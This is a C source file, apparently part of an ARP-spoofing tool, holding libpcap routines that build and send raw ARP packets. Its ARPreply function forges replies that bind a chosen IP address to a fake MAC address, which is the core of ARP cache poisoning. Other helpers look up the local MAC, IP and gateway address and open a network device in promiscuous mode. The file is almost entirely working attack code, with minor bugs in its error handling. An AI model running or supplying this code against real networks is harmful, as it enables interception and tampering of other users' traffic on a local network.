#include "send_arp.h"

void ARPrequest(struct in_addr targetIp, struct ether_addr senderMac,	struct in_addr senderIp,	pcap_t *pcd){
	const int ETHERNET_LEN = sizeof(struct ether_header);
	const int ARP_LEN = sizeof(struct ether_arp);
	struct ether_header eth;	// ethernet header struct
	struct ether_arp arph;		// arp header struct
	u_char packet[ETHERNET_LEN + ARP_LEN];		// packet

    //memset( (char*)&sendpkt, 0, sizeof(struct packet_udp));
	// make ethernet header
    eth.ether_type = htons(ETHERTYPE_ARP);
    for(int i=0;i<ETHER_ADDR_LEN;i++)
    	eth.ether_dhost[i] = 0xff;
    memcpy(eth.ether_shost, &senderMac.ether_addr_octet, ETHER_ADDR_LEN);
	// make arp header
	arph.arp_hrd = htons(ARPHRD_ETHER);	// Format of hardware address.
	arph.arp_pro = htons(ETHERTYPE_IP);	// Format of protocol address.
	arph.arp_hln = ETHER_ADDR_LEN;		// Length of hardware address.
	arph.arp_pln = 4;					// Length of protocol address. 
	arph.arp_op = htons(ARPOP_REQUEST);	// ARP opcode (command).
	memcpy(&arph.arp_sha, &senderMac.ether_addr_octet, ETHER_ADDR_LEN);
	for(int i=0;i<ETHER_ADDR_LEN;i++)
    	arph.arp_tha[i] = 0x00;
    memcpy(&arph.arp_spa, &senderIp.s_addr, 4);
    memcpy(&arph.arp_tpa, &targetIp.s_addr, 4);
    // make (ETHERNET + ARP) packet
    memcpy(packet, &eth, ETHERNET_LEN);
    memcpy(packet+ETHERNET_LEN, &arph, ARP_LEN);
    if(pcap_sendpacket(pcd, packet, ETHERNET_LEN+ARP_LEN) == -1)
    	printf("ARPrequets: pcap_sendpacket error\n");
}

void ARPreply(struct ether_addr targetMac,	struct in_addr targetIp,
			struct ether_addr fakeMac,	struct in_addr fakeIp,	pcap_t *pcd){
	const int ETHERNET_LEN = sizeof(struct ether_header);
	const int ARP_LEN = sizeof(struct ether_arp);
	struct ether_header eth;	// ethernet header struct
	struct ether_arp arph;		// arp header struct
	u_char packet[ETHERNET_LEN + ARP_LEN];		// packet

    //memset( (char*)&sendpkt, 0, sizeof(struct packet_udp));
	// make ethernet header
    eth.ether_type = htons(ETHERTYPE_ARP);
    memcpy(eth.ether_dhost, &targetMac.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(eth.ether_shost, &fakeMac.ether_addr_octet, ETHER_ADDR_LEN);
	// make arp header
	arph.arp_hrd = htons(ARPHRD_ETHER);	// Format of hardware address.
	arph.arp_pro = htons(ETHERTYPE_IP);	// Format of protocol address.
	arph.arp_hln = ETHER_ADDR_LEN;		// Length of hardware address.
	arph.arp_pln = 4;					// Length of protocol address. 
	arph.arp_op = htons(ARPOP_REPLY);	// ARP opcode (command).
	memcpy(&arph.arp_sha, &fakeMac.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arph.arp_tha, &targetMac.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arph.arp_spa, &fakeIp.s_addr, 4);
    memcpy(&arph.arp_tpa, &targetIp.s_addr, 4);
    // make (ETHERNET + ARP) packet
    memcpy(packet, &eth, ETHERNET_LEN);
    memcpy(packet+ETHERNET_LEN, &arph, ARP_LEN);
    if(pcap_sendpacket(pcd, packet, ETHERNET_LEN+ARP_LEN) == -1)
    	printf("ARP relay: pcap_sendpacket error\n");
}

void getMyIpMac(struct ether_addr *myMac, struct in_addr *myIp){
	FILE *fp;
	char buf[30] = {0};

	system("ifconfig | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > cmd.txt");
	fp = fopen("cmd.txt", "r");
	if(fp == NULL){
		printf("file open error");
	}
	fgets(buf, sizeof(buf), fp);
	ether_aton_r(buf, myMac);
	fclose(fp);

	system("ifconfig ens33 | awk '/inet addr/ {gsub(\"addr:\", \"\", $2); print $2}' > cmd.txt");
	fp = fopen("cmd.txt", "r");
	if(fp == NULL){
		printf("file open error");
	}
	fgets(buf, sizeof(buf), fp);
	inet_aton(buf, myIp);
	fclose(fp);
}

void getGWIp(struct in_addr *GWIp){
	FILE *fp;
	char buf[20] = {0};
	system("ip route show default | awk '/default/ {print $3}' > cmd.txt");
	fp = fopen("cmd.txt", "r");
	if(fp == NULL){
		printf("file open error");
	}
	fgets(buf, sizeof(buf), fp);
	inet_aton(buf, GWIp);
	fclose(fp);
}

int pcd_init(pcap_t **pcd, char **device){
	char 			errorbuffer[ERRBUF_SIZE];	// Error string

    // find the device
	*device = pcap_lookupdev(errorbuffer);
	if (device == NULL) {
		printf("No devices: %s\n", errorbuffer);
		return -1;
	}
	// open the device
	*pcd = pcap_open_live(*device, PACKET_MAX_BYTES, PROMISCUOUS_MODE, WAIT_MAX_TIME, errorbuffer);
	if(*pcd == NULL){
		printf("Cannot open device %s: %s\n", *device, errorbuffer);
		return -1;
	}
}